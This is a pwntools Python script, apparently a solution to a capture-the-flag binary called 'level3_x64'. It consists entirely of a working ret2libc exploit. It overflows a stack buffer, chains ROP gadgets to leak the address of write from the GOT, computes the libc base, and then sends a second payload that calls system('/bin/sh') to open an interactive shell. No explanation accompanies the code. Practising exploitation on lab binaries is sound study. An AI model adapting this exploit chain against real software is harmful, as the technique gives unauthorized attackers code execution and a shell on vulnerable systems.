from pwn import *

io = process("./level3_x64")

elf = ELF("./level3_x64")
write_plt = elf.symbols["write"]
write_got = elf.got["write"]
vul_addr = elf.symbols["vulnerable_function"]

io.recv()
pop_rdi_addr = 0x00000000004006b3
pop_rsi_r15_addr = 0x00000000004006b1

payload = cyclic(0x80 + 8) + p64(pop_rdi_addr) + p64(1) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(0xdeadbeef) + p64(write_plt) + p64(vul_addr)

io.sendline(payload)
temp = io.recv(8)

write_addr = u64(temp)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = write_addr - libc.symbols["write"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
sys_addr = libc_base + libc.symbols["system"]

payload2 = cyclic(0x80 + 8) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(sys_addr) + b"ret-addr"

io.recv()
io.sendline(payload2)
io.interactive()
